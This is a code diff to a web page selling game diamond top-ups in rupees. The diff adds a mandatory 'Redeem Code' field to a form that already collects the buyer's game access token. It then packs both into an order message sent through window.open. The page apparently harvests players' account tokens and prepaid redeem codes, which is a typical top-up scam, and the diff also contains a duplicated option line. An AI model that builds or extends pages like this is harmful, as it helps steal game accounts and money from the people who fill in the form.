@@ -252,7 +252,9 @@ placeholder="Access Token">
 
 <br><br>
 
-<select id="package" style="width:100%;padding:12px;border-radius:10px;">
+<select id="package"
+onchange="updateRedeemText()"
+style="width:100%;padding:12px;border-radius:10px;">
 
 <option>Select Diamond Package</option>
 
@@ -266,9 +268,27 @@ placeholder="Access Token">
 <option>5300 💎 - ₹2750</option>
 <option>9800 💎 - ₹4700</option>
 <option>11200 💎 - ₹4800</option>
-<option>22400 💎 - ₹10500</option>
+<option>22400 💎 - ₹10500</option><option>22400 💎 - ₹10500</option>
 
 </select>
+
+<p id="redeemText"
+style="color:#ffcc00;font-weight:bold;margin-top:10px;">
+🎁 Select a package first
+</p>
+
+<input
+type="text"
+id="redeemCode"
+placeholder="Enter Redeem Code"
+style="
+width:100%;
+padding:12px;
+margin-top:10px;
+border-radius:10px;">
+
+<br><br>
+
 
 <br><br>
 
@@ -452,7 +472,24 @@ navigator.clipboard.writeText(
 alert("UPI ID Copied Successfully!");
 
 }
+function updateRedeemText(){
 
+var pack =
+document.getElementById("package").value;
+
+var amount =
+pack.split("₹")[1] || "";
+
+if(amount==""){
+document.getElementById("redeemText").innerHTML =
+"🎁 Select a package first";
+return;
+}
+
+document.getElementById("redeemText").innerHTML =
+"🎁 Send Redeem Code: ₹" + amount;
+
+}
 function sendOrder(){
 
 var game =
@@ -463,7 +500,13 @@ document.getElementById("token").value;
 
 var pack =
 document.getElementById("package").value;
+var redeem =
+document.getElementById("redeemCode").value;
 
+if(redeem.trim()==""){
+alert("Please Enter Redeem Code First!");
+return;
+}
 var amount = pack.split("₹")[1] || "";
 
 var text =
@@ -472,6 +515,7 @@ var text =
 "🔑 Access Token: "+token+"\n"+
 "💎 Package: "+pack+"\n\n"+
 "💳 Send Redeem Code: ₹"+amount+"\n"+
+  "🎁 Redeem Code: "+redeem+"\n"+
 "⚠️ Top-Up will be processed after redeem code verification.";
 
 window.open(
